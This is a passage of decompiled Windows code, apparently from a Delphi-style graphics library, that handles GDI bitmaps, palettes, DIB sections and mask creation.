  if (((*(byte *)(param_1 + 0x28) & 3) != 0) && (*(int *)(param_1 + 0x40) == 0)) {
    if (*(short *)(param_1 + 0x26) == 0x10) {
      *(undefined4 *)(param_1 + 0x40) = 0xf800;
      *(undefined4 *)(param_1 + 0x44) = 0x7e0;
      *(undefined4 *)(param_1 + 0x48) = 0x1f;
    }
    else if (*(short *)(param_1 + 0x26) == 0x20) {
      *(undefined4 *)(param_1 + 0x40) = 0xff0000;
      *(undefined4 *)(param_1 + 0x44) = 0xff00;
      *(undefined4 *)(param_1 + 0x48) = 0xff;
    }
  }
  return;
}



HPALETTE FUN_0041e2e0(HBITMAP param_1,HPALETTE param_2,HPALETTE param_3,int param_4,int param_5)

{
  undefined uVar1;
  int iVar2;
  HDC pHVar3;
  HBITMAP pHVar4;
  int iVar5;
  UINT UVar6;
  HGDIOBJ pvVar7;
  HBRUSH hbr;
  COLORREF CVar8;
  uint uVar9;
  undefined extraout_CL;
  undefined extraout_CL_00;
  undefined extraout_DL;
  undefined extraout_DL_00;
  HPALETTE pHVar10;
  DWORD *pDVar11;
  LPBITMAPINFO ptVar12;
  undefined4 *in_FS_OFFSET;
  byte bVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  undefined *puVar16;
  undefined *puVar17;
  RECT local_9c;
  undefined local_8c [4];
  int local_88;
  int local_84;
  int local_78;
  int local_74;
  HPALETTE local_38;
  RGBQUAD local_34;
  undefined4 local_30;
  LPVOID local_2c;
  LPBITMAPINFO local_28;
  HDC local_24;
  HDC local_20;
  HDC local_1c;
  HGDIOBJ local_18;
  HPALETTE local_14;
  HPALETTE local_10;
  HPALETTE local_c;
  HBITMAP local_8;
  
  bVar13 = 0;
  local_14 = (HPALETTE)0x0;
  if (((*(int *)(param_5 + 0x18) == 0) ||
      ((*(int *)(param_5 + 0x1c) != 0 && (*(int *)(param_5 + 0x20) != 0)))) &&
     ((*(int *)(param_5 + 0x18) != 0 ||
      ((*(int *)(param_5 + 4) != 0 && (*(int *)(param_5 + 8) != 0)))))) {
    local_10 = param_3;
    local_c = param_2;
    local_8 = param_1;
    FUN_0041de9c((int)param_1);
    local_74 = 0;
    if (local_8 != (HBITMAP)0x0) {
      iVar2 = GetObjectA(local_8,0x54,local_8c);
      if (iVar2 < 0x18) {
        FUN_0041b1fc();
      }
    }
    pHVar3 = GetDC((HWND)0x0);
    local_1c = (HDC)FUN_0041b31c((int)pHVar3);
    pHVar3 = CreateCompatibleDC(local_1c);
    local_20 = (HDC)FUN_0041b31c((int)pHVar3);
    puVar17 = &LAB_0041e92e;
    uVar14 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffff4c;
    if (*(uint *)(param_5 + 0x18) < 0x28) {
      if ((*(ushort *)(param_5 + 0x10) | *(ushort *)(param_5 + 0x12)) == 1) {
        pHVar4 = CreateBitmap(*(int *)(param_5 + 4),*(int *)(param_5 + 8),1,1,(void *)0x0);
        local_14 = (HPALETTE)FUN_0041b31c((int)pHVar4);
      }
      else {
        pHVar4 = CreateCompatibleBitmap(local_1c,*(int *)(param_5 + 4),*(int *)(param_5 + 8));
        local_14 = (HPALETTE)FUN_0041b31c((int)pHVar4);
      }
      FUN_0041b31c((int)local_14);
      pvVar7 = SelectObject(local_20,local_14);
      local_18 = (HGDIOBJ)FUN_0041b31c((int)pvVar7);
      *in_FS_OFFSET = &stack0xffffff40;
      *in_FS_OFFSET = &stack0xffffff34;
      local_38 = (HPALETTE)0x0;
      pHVar10 = (HPALETTE)0x0;
      if (local_10 != (HPALETTE)0x0) {
        local_38 = SelectPalette(local_20,local_10,0);
        RealizePalette(local_20);
      }
      uVar14 = *in_FS_OFFSET;
      *in_FS_OFFSET = &stack0xffffff28;
      if (param_4 == 0) {
        PatBlt(local_20,0,0,*(int *)(param_5 + 4),*(int *)(param_5 + 8),0xff0062);
      }
      else {
        hbr = (HBRUSH)FUN_0041ab3c(*(int *)(param_4 + 0x14));
        FUN_0041142c(0,0,*(undefined4 *)(param_5 + 4),&local_9c.left,*(undefined4 *)(param_5 + 8));
        FillRect(local_20,&local_9c,hbr);
        CVar8 = FUN_00419f78(*(uint *)(*(int *)(param_4 + 0xc) + 0x18));
        SetTextColor(local_20,CVar8);
        uVar9 = FUN_0041ab00(*(int *)(param_4 + 0x14));
        CVar8 = FUN_00419f78(uVar9);
        SetBkColor(local_20,CVar8);
        if ((*(short *)(param_5 + 0x26) == 1) && (*(int *)(param_5 + 0x14) != 0)) {
          local_34 = (RGBQUAD)FUN_00419f78(*(uint *)(*(int *)(param_4 + 0xc) + 0x18));
          uVar9 = FUN_0041ab00(*(int *)(param_4 + 0x14));
          local_30 = FUN_00419f78(uVar9);
          SetDIBColorTable(local_20,0,2,&local_34);
        }
      }
      if (local_8 != (HBITMAP)0x0) {
        pHVar3 = CreateCompatibleDC(local_1c);
        local_24 = (HDC)FUN_0041b31c((int)pHVar3);
        uVar14 = *in_FS_OFFSET;
        *in_FS_OFFSET = &stack0xffffff1c;
        pvVar7 = SelectObject(local_24,local_8);
        pvVar7 = (HGDIOBJ)FUN_0041b31c((int)pvVar7);
        if (local_c != (HPALETTE)0x0) {
          pHVar10 = SelectPalette(local_24,local_c,0);
          RealizePalette(local_24);
        }
        if (param_4 != 0) {
          CVar8 = FUN_00419f78(*(uint *)(*(int *)(param_4 + 0xc) + 0x18));
          SetTextColor(local_24,CVar8);
          uVar9 = FUN_0041ab00(*(int *)(param_4 + 0x14));
          CVar8 = FUN_00419f78(uVar9);
          SetBkColor(local_24,CVar8);
        }
        BitBlt(local_20,0,0,*(int *)(param_5 + 4),*(int *)(param_5 + 8),local_24,0,0,0xcc0020);
        if (local_c != (HPALETTE)0x0) {
          SelectPalette(local_24,pHVar10,-1);
        }
        pvVar7 = SelectObject(local_24,pvVar7);
        FUN_0041b31c((int)pvVar7);
        *in_FS_OFFSET = uVar14;
        pHVar10 = (HPALETTE)DeleteDC(local_24);
        return pHVar10;
      }
      pHVar10 = (HPALETTE)0x0;
      *in_FS_OFFSET = uVar14;
      if (local_10 != (HPALETTE)0x0) {
        pHVar10 = SelectPalette(local_20,local_38,-1);
      }
      return pHVar10;
    }
    local_28 = (LPBITMAPINFO)FUN_004026a8(0x42c);
    puVar16 = &LAB_0041e638;
    uVar15 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffff40;
    *(undefined4 *)(param_5 + 0x18) = 0x28;
    *(undefined2 *)(param_5 + 0x24) = 1;
    if (*(short *)(param_5 + 0x26) == 0) {
      iVar2 = GetDeviceCaps(local_1c,0xc);
      iVar5 = GetDeviceCaps(local_1c,0xe);
      *(short *)(param_5 + 0x26) = (short)iVar2 * (short)iVar5;
    }
    pDVar11 = (DWORD *)(param_5 + 0x18);
    ptVar12 = local_28;
    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {
      (ptVar12->bmiHeader).biSize = *pDVar11;
      pDVar11 = pDVar11 + (uint)bVar13 * -2 + 1;
      ptVar12 = (LPBITMAPINFO)((int)ptVar12 + (uint)bVar13 * -8 + 4);
    }
    *(undefined4 *)(param_5 + 4) = *(undefined4 *)(param_5 + 0x1c);
    *(undefined4 *)(param_5 + 8) = *(undefined4 *)(param_5 + 0x20);
    if (*(ushort *)(param_5 + 0x26) < 9) {
      if ((*(short *)(param_5 + 0x26) == 1) && ((local_8 == (HBITMAP)0x0 || (local_78 == 0)))) {
        local_28->bmiColors[0] = (RGBQUAD)0x0;
        local_28[1].bmiHeader.biSize = 0xffffff;
      }
      else if (local_10 == (HPALETTE)0x0) {
        if (local_8 != (HBITMAP)0x0) {
          local_18 = SelectObject(local_20,local_8);
          if ((local_74 == 0) || (local_78 == 0)) {
            uVar9 = (int)*(uint *)(param_5 + 0x20) >> 0x1f;
            GetDIBits(local_20,local_8,0,(*(uint *)(param_5 + 0x20) ^ uVar9) - uVar9,(LPVOID)0x0,
                      local_28,0);
          }
          else {
            UVar6 = GetDIBColorTable(local_20,0,0x100,local_28->bmiColors);
            *(UINT *)(param_5 + 0x38) = UVar6;
          }
          SelectObject(local_20,local_18);
        }
      }
      else {
        FUN_0041bab0(local_10,(LPPALETTEENTRY)local_28->bmiColors,0xff);
      }
    }
    else if (((*(short *)(param_5 + 0x26) == 0x10) || (*(short *)(param_5 + 0x26) == 0x20)) &&
            ((*(byte *)(param_5 + 0x28) & 3) != 0)) {
      FUN_0041e294(param_5);
      FUN_0040285c((undefined4 *)(param_5 + 0x40),local_28->bmiColors,0xc);
    }
    pHVar4 = CreateDIBSection(local_1c,local_28,0,&local_2c,(HANDLE)0x0,0);
    local_14 = (HPALETTE)FUN_0041b31c((int)pHVar4);
    if (local_2c == (LPVOID)0x0) {
      FUN_0041b274();
    }
    if ((((local_8 == (HBITMAP)0x0) || (*(int *)(param_5 + 0x1c) != local_88)) ||
        (*(int *)(param_5 + 0x20) != local_84)) || (*(ushort *)(param_5 + 0x26) < 9)) {
      *in_FS_OFFSET = uVar15;
      pHVar10 = (HPALETTE)FUN_004026c8((int)local_28);
      return pHVar10;
    }
    uVar9 = (int)*(uint *)(param_5 + 0x20) >> 0x1f;
    iVar2 = GetDIBits(local_20,local_8,0,(*(uint *)(param_5 + 0x20) ^ uVar9) - uVar9,local_2c,
                      local_28,0);
    uVar1 = FUN_004042b4((char)iVar2,extraout_DL,extraout_CL,uVar15,puVar16);
    FUN_004042b4(uVar1,extraout_DL_00,extraout_CL_00,uVar14,puVar17);
  }
  return local_14;
}



// WARNING: Could not reconcile some variable overlaps

HPALETTE FUN_0041e944(HPALETTE param_1)

{
  int iVar1;
  HPALETTE pHVar2;
  UINT local_410;
  LOGPALETTE local_40c [128];
  
  pHVar2 = (HPALETTE)0x0;
  if (param_1 != (HPALETTE)0x0) {
    local_410 = 0;
    iVar1 = GetObjectA(param_1,4,&local_410);
    if ((iVar1 != 0) && (local_410 != 0)) {
      local_40c[0].palVersion = 0x300;
      local_40c[0].palNumEntries = (WORD)local_410;
      GetPaletteEntries(param_1,0,local_410,local_40c[0].palPalEntry);
      pHVar2 = CreatePalette(local_40c);
    }
  }
  return pHVar2;
}



BOOL FUN_0041e9a8(HPALETTE param_1,HPALETTE param_2,COLORREF param_3)

{
  int iVar1;
  HDC pHVar2;
  COLORREF color;
  BOOL BVar3;
  int *in_FS_OFFSET;
  int iVar4;
  undefined local_74 [4];
  int local_70;
  int local_6c;
  int local_60;
  undefined4 local_5c;
  HGDIOBJ local_20;
  HGDIOBJ local_1c;
  char local_15;
  HDC local_14;
  HDC local_10;
  HDC local_c;
  HBITMAP local_8;
  
  local_8 = (HBITMAP)0x0;
  if (param_1 != (HPALETTE)0x0) {
    iVar1 = GetObjectA(param_1,0x54,local_74);
    if (iVar1 != 0) {
      FUN_0041de9c((int)param_1);
      local_c = (HDC)0x0;
      local_14 = (HDC)0x0;
      iVar1 = *in_FS_OFFSET;
      *in_FS_OFFSET = (int)&stack0xffffff74;
      pHVar2 = GetDC((HWND)0x0);
      local_c = (HDC)FUN_0041b31c((int)pHVar2);
      pHVar2 = CreateCompatibleDC(local_c);
      local_14 = (HDC)FUN_0041b31c((int)pHVar2);
      iVar4 = local_70;
      local_8 = CreateBitmap(local_70,local_6c,1,1,(void *)0x0);
      if (local_8 != (HBITMAP)0x0) {
        local_20 = SelectObject(local_14,local_8);
        if (param_3 != 0x1fffffff) {
          pHVar2 = CreateCompatibleDC(local_c);
          local_10 = (HDC)FUN_0041b31c((int)pHVar2);
          *in_FS_OFFSET = (int)&stack0xffffff68;
          if (local_60 == 0) {
            local_15 = '\0';
          }
          else {
            local_15 = '\x01';
            local_5c = 0;
            iVar4 = 0;
            param_1 = FUN_0041e2e0((HBITMAP)param_1,param_2,param_2,0,(int)local_74);
          }
          local_1c = SelectObject(local_10,param_1);
          if (param_2 != (HPALETTE)0x0) {
            SelectPalette(local_10,param_2,0);
            RealizePalette(local_10);
            SelectPalette(local_14,param_2,0);
            RealizePalette(local_14);
          }
          color = SetBkColor(local_10,param_3);
          BitBlt(local_14,0,0,local_70,local_6c,local_10,0,0,0xcc0020);
          SetBkColor(local_10,color);
          if (local_1c != (HGDIOBJ)0x0) {
            SelectObject(local_10,local_1c);
          }
          if (local_15 != '\0') {
            DeleteObject(param_1);
          }
          *in_FS_OFFSET = iVar4;
          BVar3 = DeleteDC(local_10);
          return BVar3;
        }
        PatBlt(local_14,0,0,local_70,local_6c,0x42);
        if (local_20 != (HGDIOBJ)0x0) {
          SelectObject(local_14,local_20);
        }
      }
      BVar3 = 0;
      *in_FS_OFFSET = iVar1;
      if (local_14 != (HDC)0x0) {
        BVar3 = DeleteDC(local_14);
      }
      if (local_c != (HDC)0x0) {
        BVar3 = ReleaseDC((HWND)0x0,local_c);
      }
      return BVar3;
    }
  }
  return (BOOL)local_8;
}



int * FUN_0041ebb4(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_0041c480(param_1,'\0',param_3);
  param_1[0xd] = 0x20000000;
  iVar1 = FUN_00403af4((int *)&PTR_LAB_00419590,'\x01',extraout_ECX_00);
  param_1[10] = iVar1;
  FUN_0041e10c(iVar1);
  if (DAT_00440760 != '\0') {
    (**(code **)(*param_1 + 0x6c))(param_1,1);
  }
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_0041ec58(int *param_1,int *param_2)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffff84;
  undefined4 uStack112;
  undefined *puStack108;
  undefined4 local_5c [21];
  int *local_8;
  
  local_8 = param_1;
  if (param_2 != (int *)0x0) {
    uVar1 = FUN_00403cb0(param_2,(int)&LAB_004195f0);
    if ((char)uVar1 == '\0') {
      FUN_00411de4(local_8,param_2);
      return;
    }
  }
  puStack108 = (undefined *)0x41ec88;
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004428ac);
  puStack108 = &LAB_0041ed10;
  uStack112 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack112;
  if (param_2 == (int *)0x0) {
    FUN_004030a0(local_5c,0x54,0);
    in_stack_ffffff84 = 0;
    FUN_0041f614((int)local_8,0,0,(int *)0x0,0,local_5c);
  }
  else {
    FUN_0041e10c(param_2[10]);
    FUN_0041e110((int *)local_8[10]);
    local_8[10] = param_2[10];
    *(undefined *)((int)local_8 + 0x21) = *(undefined *)((int)param_2 + 0x21);
    local_8[0xd] = param_2[0xd];
    *(undefined *)(local_8 + 0xe) = *(undefined *)(param_2 + 0xe);
  }
  *in_FS_OFFSET = in_stack_ffffff84;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004428ac);
  return;
}



void FUN_0041ed48(int param_1,HBITMAP param_2,HPALETTE param_3,undefined4 *param_4)

{
  HPALETTE pHVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  undefined4 uStack120;
  undefined *puStack116;
  undefined *puStack112;
  undefined4 local_60 [21];
  HPALETTE local_c;
  HPALETTE local_8;
  
  puVar3 = local_60;
  for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = *param_4;
    param_4 = param_4 + 1;
    puVar3 = puVar3 + 1;
  }
  puStack112 = (undefined *)0x41ed6d;
  FUN_0041f3a4(param_1);
  local_8 = (HPALETTE)0x0;
  local_c = (HPALETTE)0x0;
  puStack116 = &LAB_0041edd7;
  uStack120 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack120;
  puStack112 = &stack0xfffffffc;
  pHVar1 = param_3;
  if (param_3 != DAT_00442890) {
    puStack112 = &stack0xfffffffc;
    pHVar1 = FUN_0041e944(param_3);
  }
  local_c = pHVar1;
  local_8 = FUN_0041e2e0(param_2,param_3,local_c,*(int *)(param_1 + 0x2c),(int)local_60);
  uVar4 = 0;
  FUN_0041f614(param_1,local_8,local_c,(int *)0x0,*(undefined *)(*(int *)(param_1 + 0x28) + 0x70),
               local_60);
  *in_FS_OFFSET = uVar4;
  return;
}



void FUN_0041ee08(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  
  FUN_0041f088(param_1,param_2,param_3);
  iVar1 = param_1[10];
  *(undefined4 *)(iVar1 + 0x50) = 0;
  *(undefined4 *)(iVar1 + 0x54) = 0;
  FUN_0040d16c((int **)(iVar1 + 0x6c));
  return;
}



void FUN_0041f088(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  HPALETTE pHVar2;
  BOOL BVar3;
  
  iVar1 = param_1[10];
  if (1 < *(int *)(iVar1 + 4)) {
    FUN_0041f3b4(param_1,param_2,param_3);
    if (*(char *)(iVar1 + 0x71) == '\0') {
      pHVar2 = *(HPALETTE *)(iVar1 + 0x10);
    }
    else {
      pHVar2 = (HPALETTE)0x0;
    }
    FUN_0041ed48((int)param_1,*(HBITMAP *)(iVar1 + 8),pHVar2,(undefined4 *)(iVar1 + 0x18));
    return;
  }
  if ((*(int *)(iVar1 + 8) != 0) && (*(int *)(iVar1 + 8) != *(int *)(iVar1 + 0x14))) {
    if (*(HGDIOBJ *)(iVar1 + 0x14) != (HGDIOBJ)0x0) {
      BVar3 = DeleteObject(*(HGDIOBJ *)(iVar1 + 0x14));
      if (BVar3 == 0) {
        FUN_0041b274();
      }
    }
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(iVar1 + 0x2c) = 0;
  }
  return;
}



int FUN_0041f108(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int *piVar1;
  
  if (param_1[0xb] == 0) {
    FUN_0041f3b4(param_1,param_2,param_3);
    if (param_1[0xb] == 0) {
      piVar1 = FUN_0041df18((int *)&PTR_LAB_00411ec5_3_0041dda0,'\x01',(int)param_1);
      param_1[0xb] = (int)piVar1;
      piVar1[0xb] = (int)param_1;
      piVar1[10] = *(int *)(*param_1 + 0x10);
      piVar1[0xd] = (int)param_1;
      piVar1[0xc] = (int)FUN_0041ee08;
    }
  }
  return param_1[0xb];
}



undefined4 FUN_0041f174(int param_1)

{
  int iVar1;
  undefined3 uVar3;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 0x28);
  uVar3 = (undefined3)((uint)iVar1 >> 8);
  if ((*(int *)(iVar1 + 8) == 0) || (*(int *)(iVar1 + 8) == *(int *)(iVar1 + 0x14))) {
    if (*(int *)(iVar1 + 0x14) != 0) {
      return 0;
    }
    if (*(int *)(iVar1 + 0x30) == 0) {
      uVar2 = CONCAT31(uVar3,1);
    }
    else {
      uVar2 = 0;
    }
  }
  else {
    uVar2 = CONCAT31(uVar3,1);
  }
  return uVar2;
}



undefined4 FUN_0041f1c4(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 0x28);
  if ((*(short *)(iVar1 + 0x28) == 1) && (*(short *)(iVar1 + 0x2a) == 1)) {
    return CONCAT31((int3)((uint)(iVar1 + 0x18) >> 8),1);
  }
  return 0;
}



undefined4 FUN_0041f1f4(int param_1)

{
  ushort uVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 unaff_EBX;
  undefined3 uVar5;
  undefined4 uVar4;
  
  uVar5 = (undefined3)((uint)unaff_EBX >> 8);
  uVar4 = CONCAT31(uVar5,8);
  uVar3 = FUN_0041f174(param_1);
  if ((char)uVar3 == '\x01') {
    uVar4 = 0;
  }
  else {
    iVar2 = *(int *)(param_1 + 0x28);
    uVar1 = *(ushort *)(iVar2 + 0x3e);
    if (uVar1 < 0x11) {
      if (uVar1 == 0x10) {
        if (*(int *)(iVar2 + 0x40) == 0) {
          uVar4 = CONCAT31(uVar5,4);
        }
        else if ((*(int *)(iVar2 + 0x40) == 3) && (*(int *)(iVar2 + 0x5c) == 0x7e0)) {
          uVar4 = CONCAT31(uVar5,5);
        }
      }
      else if (uVar1 == 1) {
        uVar4 = CONCAT31(uVar5,1);
      }
      else if (uVar1 == 4) {
        uVar4 = CONCAT31(uVar5,2);
      }
      else if (uVar1 == 8) {
        uVar4 = CONCAT31(uVar5,3);
      }
    }
    else if (uVar1 == 0x18) {
      uVar4 = CONCAT31(uVar5,6);
    }
    else if ((uVar1 == 0x20) && (*(int *)(iVar2 + 0x40) == 0)) {
      uVar4 = CONCAT31(uVar5,7);
    }
  }
  return uVar4;
}



int FUN_0041f278(int *param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  
  FUN_0041ee08(param_1,param_1,param_3);
  iVar1 = param_1[10];
  if ((param_2 < 0) || (*(int *)(iVar1 + 0x20) <= param_2)) {
    FUN_0041b1cc((int **)PTR_PTR_DAT_00441538);
  }
  FUN_0041f330((int)param_1);
  GdiFlush();
  if (0 < *(int *)(iVar1 + 0x38)) {
    param_2 = (*(int *)(iVar1 + 0x38) - param_2) + -1;
  }
  iVar2 = FUN_0041b4ac(*(int *)(iVar1 + 0x34),(uint)*(ushort *)(iVar1 + 0x3e),0x20);
  return iVar2 * param_2 + *(int *)(iVar1 + 0x2c);
}



uint FUN_0041f2e0(int *param_1)

{
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  
  if (param_1[0xd] == 0x20000000) {
    uVar1 = FUN_0041f1c4((int)param_1);
    if ((char)uVar1 == '\0') {
      iVar3 = (**(code **)(*param_1 + 0x20))();
      piVar4 = (int *)FUN_0041f108(param_1,extraout_EDX,extraout_ECX);
      uVar2 = FUN_0041aef8(piVar4,0,iVar3 + -1);
    }
    else {
      uVar2 = 0xffffff;
    }
  }
  else {
    uVar2 = FUN_00419f78(param_1[0xd]);
  }
  return uVar2 | 0x2000000;
}



void FUN_0041f330(int param_1)

{
  int iVar1;
  HPALETTE pHVar2;
  
  iVar1 = *(int *)(param_1 + 0x28);
  if ((*(int *)(iVar1 + 8) != 0) && (*(int *)(iVar1 + 0x14) == 0)) {
    FUN_0041f4b4(param_1);
    if (*(int *)(iVar1 + 0x30) == 0) {
      GetObjectA(*(HANDLE *)(iVar1 + 8),0x54,(LPVOID)(iVar1 + 0x18));
      *(undefined4 *)(iVar1 + 0x30) = 0x28;
      *(undefined4 *)(iVar1 + 0x34) = *(undefined4 *)(iVar1 + 0x1c);
      *(undefined4 *)(iVar1 + 0x38) = *(undefined4 *)(iVar1 + 0x20);
      *(undefined2 *)(iVar1 + 0x3c) = 1;
      *(short *)(iVar1 + 0x3e) = *(short *)(iVar1 + 0x28) * *(short *)(iVar1 + 0x2a);
    }
    pHVar2 = FUN_0041e2e0(*(HBITMAP *)(iVar1 + 8),*(HPALETTE *)(iVar1 + 0x10),
                          *(HPALETTE *)(iVar1 + 0x10),0,iVar1 + 0x18);
    *(HPALETTE *)(iVar1 + 0x14) = pHVar2;
  }
  return;
}



void FUN_0041f3a4(int param_1)

{
  if (*(int **)(param_1 + 0x2c) != (int *)0x0) {
    FUN_0041df80(*(int **)(param_1 + 0x2c));
  }
  return;
}



void FUN_0041f3b4(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY32;
  
  iVar1 = param_1[10];
  if (((*(int *)(iVar1 + 8) == 0) && (*(int *)(iVar1 + 0x14) == 0)) && (*(int *)(iVar1 + 0x6c) != 0)
     ) {
    uStackY32 = 0x41f3e1;
    FUN_004133f8(*(int **)(iVar1 + 0x6c),param_2,param_3,0,0);
    iVar1 = param_1[4];
    iVar2 = param_1[5];
    uStackY32 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStackY32;
    param_1[4] = 0;
    param_1[5] = 0;
    (**(code **)(*param_1 + 0x54))(param_1,*(undefined4 *)(param_1[10] + 0x6c));
    *in_FS_OFFSET = uStackY32;
    param_1[4] = iVar1;
    param_1[5] = iVar2;
    return;
  }
  iVar1 = param_1[10];
  if (*(int *)(iVar1 + 8) == 0) {
    *(undefined4 *)(iVar1 + 8) = *(undefined4 *)(iVar1 + 0x14);
  }
  return;
}



void FUN_0041f454(int *param_1)

{
  int iVar1;
  uint uVar2;
  BOOL BVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  
  if ((*(char *)((int)param_1 + 0x32) == '\0') || (*(char *)((int)param_1 + 0x31) == '\0')) {
    iVar1 = param_1[10];
    if (*(int *)(iVar1 + 0xc) != 0) {
      FUN_0041de9c(*(int *)(iVar1 + 0xc));
      DeleteObject(*(HGDIOBJ *)(iVar1 + 0xc));
      *(undefined4 *)(iVar1 + 0xc) = 0;
    }
    FUN_0041f3a4((int)param_1);
    FUN_0041f3b4(param_1,extraout_EDX,extraout_ECX);
    iVar1 = param_1[10];
    uVar2 = FUN_0041f2e0(param_1);
    BVar3 = FUN_0041e9a8(*(HPALETTE *)(iVar1 + 8),*(HPALETTE *)(iVar1 + 0x10),uVar2);
    *(BOOL *)(iVar1 + 0xc) = BVar3;
    *(undefined *)((int)param_1 + 0x32) = 1;
    *(undefined *)((int)param_1 + 0x31) = 1;
  }
  return;
}



void FUN_0041f4b4(int param_1)

{
  int iVar1;
  HPALETTE pHVar2;
  HDC pHVar3;
  int iVar4;
  int iVar5;
  char cVar6;
  
  iVar1 = *(int *)(param_1 + 0x28);
  if (*(char *)(param_1 + 0x30) != '\0') {
    return;
  }
  if (*(int *)(iVar1 + 0x10) != 0) {
    return;
  }
  if (*(int *)(iVar1 + 0x14) == 0) {
    return;
  }
  if (*(int *)(iVar1 + 0x14) == *(int *)(iVar1 + 8)) {
    FUN_0041de9c(*(int *)(iVar1 + 0x14));
  }
  pHVar2 = FUN_0041ba0c(*(HGDIOBJ *)(iVar1 + 0x14),(undefined4 *)0x0,
                        1 << ((byte)*(undefined2 *)(iVar1 + 0x3e) & 0x1f));
  *(HPALETTE *)(iVar1 + 0x10) = pHVar2;
  if (pHVar2 != (HPALETTE)0x0) {
    return;
  }
  pHVar3 = GetDC((HWND)0x0);
  pHVar3 = (HDC)FUN_0041b31c((int)pHVar3);
  if (*(char *)(iVar1 + 0x71) == '\0') {
    iVar4 = GetDeviceCaps(pHVar3,0xc);
    iVar5 = GetDeviceCaps(pHVar3,0xe);
    if ((int)((uint)*(ushort *)(iVar1 + 0x2a) * (uint)*(ushort *)(iVar1 + 0x28)) <= iVar4 * iVar5) {
      cVar6 = '\0';
      goto LAB_0041f545;
    }
  }
  cVar6 = '\x01';
LAB_0041f545:
  *(char *)(iVar1 + 0x71) = cVar6;
  if (cVar6 != '\0') {
    pHVar2 = CreateHalftonePalette(pHVar3);
    *(HPALETTE *)(iVar1 + 0x10) = pHVar2;
  }
  ReleaseDC((HWND)0x0,pHVar3);
  if (*(int *)(iVar1 + 0x10) == 0) {
    *(undefined *)(param_1 + 0x30) = 1;
  }
  return;
}



void FUN_0041f56c(int *param_1,short param_2,HBITMAP param_3,HPALETTE param_4)

{
  int iVar1;
  undefined4 local_58 [5];
  int local_44;
  undefined4 local_40;
  
  if ((param_2 != 2) || (param_3 == (HBITMAP)0x0)) {
    FUN_0041b1e4((int **)PTR_PTR_DAT_004414fc);
  }
  FUN_0041f3a4((int)param_1);
  FUN_004030a0(local_58,0x54,0);
  GetObjectA(param_3,0x54,local_58);
  if (local_44 == 0) {
    local_40 = 0;
  }
  FUN_0041ed48((int)param_1,param_3,param_4,local_58);
  *(undefined *)(param_1[10] + 0x70) = 0;
  iVar1 = (**(code **)(*param_1 + 0x24))();
  *(bool *)((int)param_1 + 0x22) = iVar1 != 0;
  (**(code **)(*param_1 + 0x10))(param_1,param_1);
  return;
}



void FUN_0041f614(int param_1,undefined4 param_2,undefined4 param_3,int *param_4,undefined param_5,
                 undefined4 *param_6)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *in_FS_OFFSET;
  byte bVar5;
  undefined4 uStackY36;
  
  bVar5 = 0;
  iVar1 = FUN_00403af4((int *)&PTR_LAB_00419590,'\x01',param_3);
  uStackY36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY36;
  *(undefined4 *)(iVar1 + 8) = param_2;
  *(undefined4 *)(iVar1 + 0x10) = param_3;
  puVar4 = (undefined4 *)(iVar1 + 0x18);
  for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = *param_6;
    param_6 = param_6 + (uint)bVar5 * -2 + 1;
    puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
  }
  *(undefined *)(iVar1 + 0x70) = param_5;
  if (*(int *)(iVar1 + 0x2c) != 0) {
    *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(iVar1 + 8);
  }
  uVar2 = FUN_00403cd4(param_4,(int)&PTR_LAB_00411360);
  *(undefined4 *)(iVar1 + 0x6c) = uVar2;
  *in_FS_OFFSET = uStackY36;
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004428ac);
  uStackY36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY36;
  FUN_0041e110(*(int **)(param_1 + 0x28));
  *(int *)(param_1 + 0x28) = iVar1;
  FUN_0041e10c(iVar1);
  *in_FS_OFFSET = uStackY36;
  uStackY36 = 0x41f6fa;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004428ac);
  return;
}



